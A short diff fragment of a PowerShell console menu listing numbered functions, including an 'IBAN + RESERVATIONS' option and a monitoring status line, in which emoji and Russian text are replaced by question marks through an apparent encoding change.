     Write-Host "   28) Clear Function 27"
-    Write-Host "   29) 🏆 IBAN + RESERVATIONS (Function 14 → Function 18)"
+    Write-Host "   29) ?? IBAN + RESERVATIONS (Function 14 ? Function 18)"
     Write-Host "   30) Clear Function 29"
     Write-Host "==========================================="
     
-    $monitorStatus = if (Test-Path $MonitorPlatformsFlag) { "✅ ACTIVE" } else { "❌ DISABLED" }
-    Write-Host "📊 Function 26 status: $monitorStatus (работает параллельно)" -ForegroundColor Cyan
+    $monitorStatus = if (Test-Path $MonitorPlatformsFlag) { "? ACTIVE" } else { "? DISABLED" }
+    Write-Host "?? Function 26 status: $monitorStatus (???????? ???????????)" -ForegroundColor Cyan
     Write-Host ""
     
     $opt = Read-Host "Enter option"
